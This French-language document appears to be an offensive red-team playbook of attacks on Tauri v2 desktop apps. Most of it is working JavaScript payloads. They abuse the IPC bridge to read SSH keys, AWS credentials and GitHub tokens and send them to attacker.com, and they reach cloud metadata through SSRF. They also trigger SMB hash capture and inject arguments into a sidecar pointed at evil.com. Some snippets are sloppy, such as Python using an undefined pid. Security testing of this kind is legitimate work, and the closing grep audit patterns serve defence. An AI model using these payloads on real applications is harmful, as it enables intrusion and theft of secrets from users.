# Tauri IPC Attacks
> Base de connaissances offensive pour adversary-simulation-rust-react

## Vue d'ensemble

L'IPC bridge de Tauri v2 expose `window.__TAURI_INTERNALS__` dans chaque WebView, injecté par le runtime avant `window.onload`. Un attaquant ayant obtenu l'exécution JavaScript peut appeler toute commande Rust autorisée par les capabilities de la fenêtre. L'audit Radically Open Security (2024) a identifié 11 findings High dans cette surface, incluant la possibilité pour n'importe quel iframe d'appeler les méthodes IPC (TAU2-003) et la fusion des scopes entre fenêtres (TAU2-049).

---

## Techniques d'attaque

### Technique 1 — Invocation IPC directe depuis la WebView

**Vecteur** : `window.__TAURI_INTERNALS__.invoke()` est accessible même si `withGlobalTauri: false`

**Prérequis** : Exécution JavaScript dans le contexte de la fenêtre (XSS, supply chain npm, code malveillant injecté)

**Etapes d'exploitation** :
```javascript
// Sonder les commandes disponibles
window.__TAURI_INTERNALS__.invoke('get_articles')
  .then(d => fetch('https://attacker.com/exfil', {
    method: 'POST', body: JSON.stringify(d)
  }));

// Tenter l'accès filesystem (si fs:allow-read-file accordé)
window.__TAURI_INTERNALS__.invoke('plugin:fs|read_text_file', {
  path: '$HOME/.ssh/id_rsa'
}).then(d => new Image().src = 'https://attacker.com/?d=' + btoa(d));

// Exécuter le sidecar avec arguments injectés (si shell:allow-execute accordé)
window.__TAURI_INTERNALS__.invoke('plugin:shell|execute', {
  program: 'mon-sidecar',
  args: ['--extract', '/etc/passwd', '--send', 'https://evil.com']
});

// Inventaire des clés internes exposées
alert(JSON.stringify(Object.keys(window.__TAURI_INTERNALS__ || {})));
```

**Impact** : Accès à toutes les commandes autorisées par les capabilities — lecture filesystem, exécution sidecar, requêtes HTTP via backend Rust

**CVE associés** : CVE-2025-31477 (CVSS 9.3/9.8), CVE-2024-35222 (CVSS 5.9)

---

### Technique 2 — Bypass du modèle deny-by-default via mauvaise configuration

**Vecteur** : Les capabilities chargées depuis `src-tauri/capabilities/*.json` — tous les fichiers du répertoire sont chargés automatiquement, y compris les fichiers de test oubliés

**Prérequis** : Accès à la WebView (pas nécessairement un XSS — dev tools, dépendance compromise)

**Etapes d'exploitation** :

Chercher `"args": true` dans les scopes shell — c'est une faille critique permettant l'injection d'arguments arbitraires :
```json
// Configuration vulnérable (cible à trouver)
{
  "identifier": "shell:allow-spawn",
  "allow": [{ "name": "mon-sidecar", "sidecar": true, "args": true }]
}
```

Chercher `"path": "**"` dans les scopes filesystem — accès intégral :
```json
// Configuration vulnérable
{ "identifier": "fs:allow-read-file", "allow": [{ "path": "**" }] }
```

Chercher `"url": "http://**"` dans les scopes HTTP — SSRF possible :
```javascript
import { fetch } from '@tauri-apps/plugin-http';
const meta = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
const admin = await fetch('http://192.168.1.1/admin/config');
```

**Impact** : Contournement total du modèle de permissions, accès arbitraire au filesystem, SSRF vers réseaux internes, exécution de commandes arbitraires via sidecar

---

### Technique 3 — SSRF via plugin HTTP Tauri

**Vecteur** : Les requêtes via `tauri-plugin-http` transitent par le backend Rust, contournant CORS et les protections navigateur

**Prérequis** : Capability `http:allow-fetch` avec scope trop permissif (`http://**` ou absence de deny pour IP internes)

**Etapes d'exploitation** :
```javascript
// SSRF vers metadata cloud AWS
const resp = await window.__TAURI_INTERNALS__.invoke('plugin:http|fetch', {
  url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  method: 'GET'
});

// Scan réseau interne — contourne les restrictions CORS
const admin = await window.__TAURI_INTERNALS__.invoke('plugin:http|fetch', {
  url: 'http://192.168.1.1/admin/config', method: 'GET'
});

// IPv6 loopback bypass
await fetch_via_tauri('http://[::1]:8080/admin');

// Encodage hexadécimal pour bypass de filtres
await fetch_via_tauri('http://0x7f000001:8080/secret');
```

**Impact** : Accès aux services cloud (credentials AWS, GCP, Azure), scan du réseau interne, accès aux interfaces d'administration locales

---

### Technique 4 — Path traversal via scopes filesystem mal configurés

**Vecteur** : Scopes filesystem utilisant des globs trop larges ou ne bloquant pas les symlinks

**Prérequis** : Capability `fs:allow-read-file` ou `fs:allow-write-file` avec scope `$APPDATA/**`

**Etapes d'exploitation** :
```javascript
// Scénario : attaquant avec accès écriture à $APPDATA crée un symlink
// Cible : $APPDATA/data.txt -> ~/.ssh/id_rsa
// Exploit :
window.__TAURI_INTERNALS__.invoke('plugin:fs|read_text_file', {
  path: '$APPDATA/data.txt'  // Suit le symlink → lit ~/.ssh/id_rsa
});

// Traversée directe si le scope utilise ** sans restriction
window.__TAURI_INTERNALS__.invoke('plugin:fs|read_text_file', {
  path: '$HOME/.aws/credentials'
});
window.__TAURI_INTERNALS__.invoke('plugin:fs|read_text_file', {
  path: '$HOME/.config/gh/hosts.yml'  // Token GitHub CLI
});
```

**Cibles prioritaires à tester** :
- `$HOME/.ssh/id_rsa` — clés SSH
- `$HOME/.aws/credentials` — credentials AWS
- `$HOME/.config/gh/hosts.yml` — token GitHub
- `$HOME/.docker/config.json` — auth Docker registries
- `$APPLOCALDATA/EBWebView/**` — données WebView2 sensibles (Windows)

**Impact** : Exfiltration de secrets stockés sur le système

---

### Technique 5 — CVE-2025-31477 : RCE via shell plugin open

**Vecteur** : `tauri-plugin-shell` < 2.2.1 — l'endpoint `open` n'était pas valide pour les protocoles autorisés

**Prérequis** : Application utilisant `tauri-plugin-shell` version < 2.2.1 avec la permission `shell:allow-open`

**Etapes d'exploitation** :
```javascript
// Exécution d'un binaire local via le gestionnaire de protocoles
window.__TAURI_INTERNALS__.invoke('plugin:shell|open', {
  path: 'file:///c:/windows/system32/calc.exe'
});

// Accès partage réseau Windows (NTLM hash capture)
window.__TAURI_INTERNALS__.invoke('plugin:shell|open', {
  path: 'smb://attacker.com/share'
});

// Montage NFS malveillant
window.__TAURI_INTERNALS__.invoke('plugin:shell|open', {
  path: 'nfs://attacker.com/mount'
});
```

**Impact** : Exécution de code à distance (RCE) via les gestionnaires de protocoles système

**CVE associés** : CVE-2025-31477 (CVSS 9.3 selon DATA-03, CVSS 9.8 selon DATA-14)

---

### Technique 6 — Bypass du pattern d'isolation Tauri

**Vecteur** : Le pattern d'isolation protège contre les attaques supply chain mais pas contre un XSS dans la fenêtre principale

**Prérequis** : Application utilisant l'Isolation Pattern avec la clé de chiffrement extractible (avant correctif PR #9327)

**Etapes d'exploitation** :
```javascript
// Audit ROS (TAU2-040) : la clé AES-GCM de l'isolation était extractible
// depuis le JavaScript avec SubtleCrypto extractable: true
// Un attaquant pouvait forger des appels IPC arbitraires

// Si l'attaquant a un XSS dans la WebView principale,
// il exécute dans le MÊME contexte que le code légitime
// L'isolation ne crée pas de frontière de sécurité absolue dans ce cas
const internals = window.__TAURI_INTERNALS__;
// Accès direct à toutes les capabilities de la fenêtre courante
```

**Note** : Sur Linux et Android, Tauri ne distingue pas les requêtes d'un iframe de celles de la fenêtre principale — les iframes peuvent invoquer l'IPC.

**Impact** : Forgeage d'appels IPC arbitraires

**CVE associés** : CVE-2024-35222 (CVSS 5.9) — iframes bypass les contrôles d'accès IPC

---

### Technique 7 — HMAC tag spoofing sur IPC Rust-sidecar

**Vecteur** : L'IPC entre Rust core et sidecar Python est non authentifié par défaut — stdin/stdout sans chiffrement ni HMAC

**Prérequis** : Accès local en tant que même utilisateur (UID), ou compromission du sidecar Python

**Etapes d'exploitation** :
```python
# Injection directe dans stdin du processus sidecar (même UID)
import os
import subprocess

# Identifier le PID du sidecar
# Injecter des données malveillantes via /proc/PID/fd/0 (stdin)
# Sur Linux : les file descriptors stdin/stdout sont visibles via /proc

# Variables d'environnement exposées
cat_environ = open(f'/proc/{pid}/environ', 'rb').read()
# Contient : AWS_SECRET_ACCESS_KEY, ANTHROPIC_API_KEY, etc.

# Arguments CLI exposés
cat_cmdline = open(f'/proc/{pid}/cmdline', 'rb').read()
# Révèle : les URLs scrapeées, chemins de sortie, keywords
```

**Impact** : Interception des communications Rust-sidecar, injection de données malveillantes dans le pipeline, exfiltration des secrets passés via l'environnement

---

### Technique 8 — Deep link injection

**Vecteur** : URLs malveillantes passées via les deep links de l'application

**Prérequis** : Application enregistrant un schéma URI custom (`monapp://`)

**Etapes d'exploitation** :
```
monapp://action?file=../../etc/passwd&callback=https://evil.com
monapp://scrape?url=file:///etc/passwd
monapp://settings?config=../../.ssh/id_rsa
```

**Impact** : Path traversal, SSRF, exfiltration de fichiers si les paramètres sont passés sans validation aux commandes Rust

---

### Technique 9 — Exposition de TAURI_PRIVATE_KEY via config Vite

**Vecteur** : Configuration Vite avec `envPrefix: ['VITE_', 'TAURI_']` expose la clé privée de signature dans le bundle frontend

**Prérequis** : Bundle frontend extractible (toujours le cas dans Tauri)

**Etapes d'exploitation** :
```bash
# Extraction du bundle JS Tauri
unzip monapp.AppImage -d extracted/ 2>/dev/null || true
find extracted/ -name "*.js" | xargs grep -l "TAURI_PRIVATE_KEY"
# La clé de signature des mises à jour est dans le bundle
# Permet de signer des mises à jour malveillantes
```

**Impact** : Compromission du canal de mise à jour, distribution de mises à jour malveillantes signées

---

## CVEs et références

| CVE | Composant | CVSS | Date | Impact |
|-----|-----------|------|------|--------|
| CVE-2025-31477 | tauri-plugin-shell < 2.2.1 | 9.3/9.8 | Avril 2025 | RCE via protocoles file://, smb://, nfs:// dans open |
| CVE-2024-35222 | Tauri Core | 5.9 | Mai 2024 | iframes bypass les contrôles d'accès IPC |
| CVE-2024-24576 | Rust std::process::Command | 10.0 | 2024 | BatBadBut — injection commande via .bat/.cmd Windows |
| CVE-2024-43402 | Rust std::process::Command | — | 2024 | Correctif incomplet de CVE-2024-24576 |
| CVE-2026-0628 | Chrome/WebView2 | Élevé | Janvier 2026 | Bypass policy dans WebView — affecte Tauri Windows |
| AIKIDO-2025-10340 | Chromium Mojo IPC | — | 2025 | Fuite de handles inter-processus (contexte Electron, pertinent pour comparaison) |

---

## Patterns de recherche (grep)

```bash
# Permissions dangereuses dans les capabilities Tauri
grep -rn '"args": true' src-tauri/capabilities/
grep -rn '"path": "\*\*"' src-tauri/capabilities/
grep -rn 'http://' src-tauri/capabilities/
grep -rn 'shell:allow-execute\|shell:allow-spawn' src-tauri/capabilities/
grep -rn 'withGlobalTauri.*true' src-tauri/tauri.conf.json

# Fichiers de capabilities de test oubliés en production
ls -la src-tauri/capabilities/
grep -rn '"windows": \["\*"\]' src-tauri/capabilities/

# Scopes filesystem trop larges
grep -rn 'allow-read-file\|allow-write-file' src-tauri/capabilities/

# Clé de mise à jour exposée dans config Vite
grep -n 'TAURI_' vite.config.ts vite.config.js 2>/dev/null
grep -n 'envPrefix' vite.config.ts vite.config.js 2>/dev/null

# Commandes custom exposées (toutes accessibles par défaut via invoke)
grep -rn '#\[tauri::command\]' src-tauri/src/

# IPC non authentifié vers sidecar
grep -rn 'stdin\|stdout\|sidecar' src-tauri/src/ | grep -v hmac | grep -v sign
```
